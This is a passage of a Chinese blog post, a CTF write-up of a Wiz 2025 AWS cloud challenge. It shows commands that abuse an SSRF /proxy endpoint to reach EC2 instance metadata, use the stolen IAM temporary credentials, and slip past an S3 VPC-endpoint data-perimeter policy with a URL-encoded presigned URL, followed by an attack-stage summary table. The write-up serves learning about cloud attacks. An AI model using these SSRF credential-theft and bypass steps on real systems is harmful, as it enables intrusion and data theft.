+<p><img src="/image/image_V-suVkmbOh.png" srcset="/img/loading.gif" lazyload alt="图 13：从 EC2 实例的  identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance  路径获取 IAM 临时凭证" title="图 13：从 EC2 实例的  identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance  路径获取 IAM 临时凭证"></p>
+<p>遇到两个不同的 IAM 临时凭证，我们可以使用下述命令，对它们的权限进行区分辨认。</p>
+<ul>
+<li><p>步骤 1：使用<code>aws configure set</code> 手动设置所有字段（包括 token）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure <span class="hljs-built_in">set</span> aws_access_key_id YOUR_ACCESS_KEY_ID<br>aws configure <span class="hljs-built_in">set</span> aws_secret_access_key YOUR_SECRET_ACCESS_KEY<br>aws configure <span class="hljs-built_in">set</span> aws_session_token YOUR_SESSION_TOKEN<br><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>步骤 2：查询当前凭证所代表的身份信息；</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws sts get-caller-identity<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p>通过对比，我们得知这两个身份实际都代表同一个 EC2 实例角色，都由同一角色派生，具备同样的权限。</p>
+<ul>
+<li><code>identity-credentials/ec2/security-credentials/ec2-instance</code> 返回的角色名<code>aws:ec2-instance</code>是 AWS 抽象出来的默认名，更注重隐藏角色名细节（例如用于托管服务中），但不利于权限审计。</li>
+</ul>
+<p><img src="/image/image_uE_RWCsndd.png" srcset="/img/loading.gif" lazyload alt="图 14：识别 identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance 的临时凭证的身份信息" title="图 14：识别 identity-credentials&#x2F;ec2&#x2F;security-credentials&#x2F;ec2-instance 的临时凭证的身份信息"></p>
+<ul>
+<li><code>iam/security-credentials/challenge01-5592368</code>返回的角色名<code>challenge01-5592368</code>是真实具体的角色名，更便于识别角色来源、权限分析和安全审计。</li>
+</ul>
+<p><img src="/image/image_g4PU-qh09M.png" srcset="/img/loading.gif" lazyload alt="图 15：识别 iam&#x2F;security-credentials&#x2F;challenge01-5592368 的临时凭证的身份信息" title="图 15：识别 iam&#x2F;security-credentials&#x2F;challenge01-5592368 的临时凭证的身份信息"></p>
+<h3 id="2-6-分析权限：尝试访问-S3-内容"><a href="#2-6-分析权限：尝试访问-S3-内容" class="headerlink" title="2.6 分析权限：尝试访问 S3 内容"></a>2.6 分析权限：尝试访问 S3 内容</h3><p>我们直接拿<code>challenge01-5592368</code>的 IAM 临时凭证来进行测试，试图递归列出存储桶中的对象。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://challenge01-470f711 --recursive<br><br></code></pre></td></tr></table></figure>
+
+<p>成功过后，我们再将<code>private/flag.txt</code>的文件内容下载下来并直接输出到终端中。但文件下载失败。</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">aws s3 cp s3://challenge01-470f711/private/flag.txt -<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_Ujg069vruY.png" srcset="/img/loading.gif" lazyload alt="图 16 使用 challenge01-5592368 的 IAM 临时凭证列出 S3 存储桶中的对象，但无法下载" title="图 16 使用 challenge01-5592368的 IAM 临时凭证列出 S3 存储桶中的对象，但无法下载"></p>
+<h3 id="2-7-识别障碍：遭遇数据边界策略阻挡"><a href="#2-7-识别障碍：遭遇数据边界策略阻挡" class="headerlink" title="2.7 识别障碍：遭遇数据边界策略阻挡"></a>2.7 识别障碍：遭遇数据边界策略阻挡</h3><p>题目描述里说了：目标环境使用了 AWS 数据边界（Data Perimeter）来限制对该存储桶内容的访问。那么我们来查看一下我们从 EC2 中获取的 IAM 临时凭证中关于<code>challenge01-470f711</code>存储桶的策略。</p>
+<figure class="highlight plaintext"><figcaption><span>jsx</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs react">aws s3api get-bucket-policy --bucket challenge01-470f711 --query &quot;Policy&quot; --output text | jq .<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_WiC4fPQQQd.png" srcset="/img/loading.gif" lazyload alt="图 17：输出 challenge01-470f711 存储桶的策略" title="图 17：输出 challenge01-470f711 存储桶的策略"></p>
+<p>这是一个基于 VPC Endpoint 的访问限制策略，属于 AWS 实施数据边界 控制的一种典型方式。该策略文档的作用是：只有通过 VPCE 为<code>vpce-0dfd8b6aa1642a057</code> 的请求，才能读取<code>private/*</code> 下的对象。否则拒绝。</p>
+<p>AWS 的数据边界是一种安全设计模式，用于限制数据只能在组织内部访问，防止被跨境或跨账户泄露。这里使用的机制是：<strong>S3 + VPC Endpoint + Bucket Policy 中的</strong>**<code>aws:SourceVpce</code>条件 **。属于数据边界策略的一种实现方式，官方在数据外泄防护（DLP）文档中也推荐这种做法。详情请看<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html" title="《What is Amazon S3?》">《What is Amazon S3?》</a></p>
+<p><img src="/image/image_ul60bJoNwG.png" srcset="/img/loading.gif" lazyload alt="图 18：AWS 官方推荐的实现数据边界策略的方式" title="图 18：AWS 官方推荐的实现数据边界策略的方式"></p>
+<p>接下来，我们需要总结一下我们前面做了哪些努力，遇到了什么问题。</p>
+<p>假设你站在堡垒的外面，四处被高墙包围，你自己是无法直接潜入的。但你突然发现了一扇窗户：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/<br></code></pre></td></tr></table></figure>
+
+<p>这不是一扇普通的窗，而是一扇可以帮你传话的窗——你只要把你想说的话（URL）塞进去，它就会替你在内部喊出来。</p>
+<p>而<code>/proxy</code> 接口就是一台放在堡垒里面的传声筒，你只需要在外面悄咪说一句：“帮我看一下 169.254.169.254 嘛～”，它就真的替你问了！而 169.254.169.254 是 EC2 实例的内部情报局元数据服务，外部是绝对接触不到的。</p>
+<p>所以，这就意味着：</p>
+<ul>
+<li>这个 <code>/proxy</code> 很有可能是部署在 EC2 实例中的；</li>
+<li>它属于某个内部网络（VPC），而且这个 VPC 正好连着一个 S3 的 VPC 端点；</li>
+</ul>
+<p>那么你让它发请求，就等于借了一艘在堡垒里的船，帮你偷偷穿过内网，去联系只有“堡垒内部”能访问的 S3 对象。于是，你美滋滋地让 <code>/proxy</code> 去帮你访问 S3，结果 S3 把你挡在门外，一巴掌打回来：Forbidden！！</p>
+<p><img src="/image/image_vzLYj6-VDQ.png" srcset="/img/loading.gif" lazyload alt="图 19：直接让 &#x2F;proxy 去访问存储桶中的对象失败" title="图 19：直接让 &#x2F;proxy 去访问存储桶中的对象失败"></p>
+<p>为什么？因为 S3 说：“你虽然是从允许的网络（VPC Endpoint）过来的，但你没票啊！”，而这个“票”指的就是签名，也就是访问凭证。即使你通过了网络边界，也得说明你是谁。这个时候你意识到：</p>
+<ul>
+<li><code>/proxy</code>只是一个 HTTP 请求中继接口，它不会使用 EC2 实例自身的 AWS 凭证去发起带签名的 S3 请求；</li>
+<li>它不是用 AWS SDK 写的，也没有自动注入 IAM 临时凭证来“代表你”签名；</li>
+<li>所以即使它从“堡垒内部”发出请求，没有签名的 HTTP 请求也会被 S3 拒绝。</li>
+</ul>
+<p>总结一下就是：你有了一艘偷偷潜入内网的船（<code>/proxy</code>），但船上没有船票（签名），所以还是上不了岸（访问不到 S3）。接下来你需要做的事情是：自己在外面先买好票，然后把票塞给那艘船，再让它进去，就能顺利通行了。</p>
+<p><img src="/image/image_2_sBWwwLJ9.png" srcset="/img/loading.gif" lazyload alt="图 20：总结前面所做的工作" title="图20：总结前面所做的工作"></p>
+<h3 id="2-8-曲线救国：借用-SSRF-加预签名-URL-偷渡"><a href="#2-8-曲线救国：借用-SSRF-加预签名-URL-偷渡" class="headerlink" title="2.8 曲线救国：借用 SSRF 加预签名 URL 偷渡"></a>2.8 曲线救国：借用 SSRF 加预签名 URL 偷渡</h3><p>若要在外面提前买好票，我们需要生成预签名 URL。<strong>预签名 URL（Presigned URL）</strong> 是 Amazon S3 提供的一种“临时授权链接”，让你可以把 S3 上的私有文件，在限定时间内安全地分享给别人，而不需要给对方任何 AWS 账户或权限。</p>
+<p><img src="/image/image_y5wX5DdYN6.png" srcset="/img/loading.gif" lazyload alt="图 21：使用预签名 URL 访问原理" title="图21：使用预签名 URL 访问原理"></p>
+<p>执行下述命令，即可生成预签名 URL，详情请看 AWS 官方文档<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html" title="《使用预签名 URL 共享对象》">《使用预签名 URL 共享对象》</a>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 presign s3://challenge01-470f711/private/flag.txt <br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_jNB7m3zF3M.png" srcset="/img/loading.gif" lazyload alt="图 22：生成预签名 URL" title="图 22：生成预签名URL"></p>
+<p>然后，我们再尝试使用 <code>/proxy</code> 去访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=&lt;Presigned_URL&gt;&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_x_B9HVQtu6.png" srcset="/img/loading.gif" lazyload alt="图 23：让 &#x2F;proxy 拿预签名 URL 去访问失败" title="图 23 ： 让 &#x2F;proxy 拿预签名 URL 去访问失败"></p>
+<p>访问失败，并返回：<code>HTTP error: 400 Bad Request</code>。预签名 URL 中包含很多特殊字符，必须进行 URL 编码，否则在作为<code>?url=</code> 参数传给 proxy 时会被截断，导致请求错误。</p>
+<p>所以，我们需要在生成预签名 URL 的时候，同时将其进行完整的 URL 编码。然后再使用 <code>/proxy</code> 进行访问。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 presign s3://challenge01-470f711/private/flag.txt | jq -sRr @uri <br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_t_b2U3qBFJ.png" srcset="/img/loading.gif" lazyload alt="图 24：对预签名 URL 进行 URL 编码后，再让 &#x2F;proxy 去访问" title="图 24：对预签名 URL 进行 URL编码后，再让 &#x2F;proxy 去访问"></p>
+<p>OK，flag 出现了，各位大佬快去试试吧！</p>
+<p><img src="/image/image_pE444Rt2JW.png" srcset="/img/loading.gif" lazyload alt="图 25：成功获取到 flag" title="图 25：成功获取到 flag"></p>
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>这道题的攻击核心是利用 SSRF（通过<code>/proxy</code>接口）访问 EC2 实例的元数据服务，从而获取临时 IAM 凭证，接着绕过 S3 所设置的数据边界策略。</p>
+<p>虽然目标环境启用了 IMDSv2，引入了 token 机制增加了攻击门槛，但该机制仍可以通过 SSRF 方式绕过。</p>
+<p>由于 S3 存储桶配置了基于 VPC Endpoint 的访问限制（Data Perimeter），导致即便拥有凭证也无法直接访问受限对象，因此需要借助 AWS S3 的预签名 URL（Presigned URL）实现“提前签票”，再通过<code>/proxy</code> 由内部发起请求，从而成功读取目标数据。</p>
+<p>整个过程的本质是：利用 EC2 的 IAM 凭证进行签名 → 外部生成预签名 URL → 内部 SSRF 发起请求，实现对受保护 S3 对象的访问。</p>
+<table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>Tactic</th>
+<th>Technique</th>
+<th>Procedure</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>初始侦察</td>
+<td>情报收集（Reconnaissance）</td>
+<td>识别暴露的应用服务</td>
+<td>使用`curl`探测 Actuator 接口，发现目标为 Spring Boot 应用，暴露了`&#x2F;actuator&#x2F;env`和`&#x2F;actuator&#x2F;mappings`</td>
+</tr>
+<tr>
+<td>初始访问</td>
+<td>敏感信息收集（Information Disclosure）</td>
+<td>泄露的环境变量</td>
+<td>通过`&#x2F;actuator&#x2F;env` 获取到 S3 Bucket 名称</td>
+</tr>
+<tr>
+<td>权限尝试</td>
+<td>未授权访问（Access Attempt）</td>
+<td>匿名访问 S3 存储桶</td>
+<td>使用`aws s3 ls –no-sign-request` 访问 S3 存储桶失败，提示权限受限</td>
+</tr>
+<tr>
+<td>权限探索</td>
+<td>功能接口分析（API Enumeration）</td>
+<td>枚举 Actuator 接口</td>
+<td>`&#x2F;actuator&#x2F;mappings`揭示了存在 SSRF 的`&#x2F;proxy?url&#x3D;` 接口</td>
+</tr>
+<tr>
+<td>权限提升</td>
+<td>SSRF 攻击</td>
+<td>访问 EC2 元数据服务</td>
+<td>使用`&#x2F;proxy` SSRF 绕过内网隔离，访问 IMDS 获取 token 失败，确认目标使用 IMDSv2</td>
+</tr>
+<tr>
+<td>认证绕过</td>
+<td>SSRF + Token Bypass</td>
+<td>获取 EC2 token</td>
+<td>通过 SSRF`PUT` 请求获取 IMDSv2 token，再通过 token 成功访问元数据</td>
+</tr>
+<tr>
+<td>凭证获取</td>
+<td>获取云凭证（Cloud Credential Access）</td>
+<td>访问 IAM 临时凭证路径</td>
+<td>读取`iam&#x2F;security-credentials`和`identity-credentials` 中的 AWS 临时凭证</td>
+</tr>
+<tr>
+<td>身份识别</td>
+<td>确认凭证身份</td>
+<td>`sts get-caller-identity`</td>
+<td>验证两个临时凭证为相同 EC2 实例角色派生的 IAM 身份</td>
+</tr>
+<tr>
+<td>横向移动</td>
+<td>访问受限资源</td>
+<td>使用 IAM 凭证访问 S3</td>
+<td>使用`aws s3 ls&#x2F;cp`尝试访问`private&#x2F;flag.txt`，但遭遇 VPC Endpoint 限制，访问被拒绝</td>
+</tr>
+<tr>
+<td>数据外泄</td>
+<td>绕过数据边界限制</td>
+<td>使用预签名 URL</td>
+<td>利用 IAM 凭证生成`presigned URL`，并通过 SSRF`&#x2F;proxy` 访问目标对象</td>
+</tr>
+<tr>
+<td>技术细节</td>
+<td>SSRF + URL 编码绕过</td>
+<td>修复 URL 编码问题</td>
+<td>对`presigned URL`使用`jq -sRr @uri` 进行编码，最终成功访问并获取 flag</td>
+</tr>
+</tbody></table>
+<p>我们对这道题目进行了详细说明与拆解，非常适合新手按步骤操作。同时，也有大佬指出可以进一步拓展学习：</p>
+<ul>
+<li>OSS（Object Storage Service）有几种 Bucket Policy？例如，本题涉及的基于身份的访问控制（如 IAM 用户&#x2F;角色访问）以及基于请求来源的条件限制（如 <code>aws:Referer</code>）。</li>
+<li>OSS 的签名方式有哪些？例如，本题考察的基于 Access Key 和 Secret 的签名机制，以及 URL 签名（Presigned URL）：临时生成用于访问私有对象的链接。</li>
+</ul>
+<p>否则，仅仅了解解题思路，却不知道如何进行思考和总结，学习效果会大打折扣。若你觉得本篇文章还有一些不好理解的地方，欢迎进入我们的读者交流群，我们一起探讨。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/AWS-%E5%AE%89%E5%85%A8/" class="print-no-link">#AWS 安全</a>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>WIZ-2025 竞标赛 - 第一期 (June)</div>
+      <div>http://example.com/2025/07/03/WIZ-2025竞标赛-第一期-June/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Yaney</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/30/%E4%BB%8E-CVE-2025-32463-%E8%B0%88%E5%8F%8A-chroot-%E7%9A%84%E5%AE%B9%E5%99%A8%E9%9A%94%E7%A6%BB%E5%AE%89%E5%85%A8%E6%80%A7/" title="从 CVE-2025-32463 谈及 chroot 的容器隔离安全性">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">从 CVE-2025-32463 谈及 chroot 的容器隔离安全性</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/20/%E6%9C%89%E7%8B%90%EF%BC%88%E6%A5%94%E5%AD%90%EF%BC%89/" title="有狐（楔子）">
+                        <span class="hidden-mobile">有狐（楔子）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
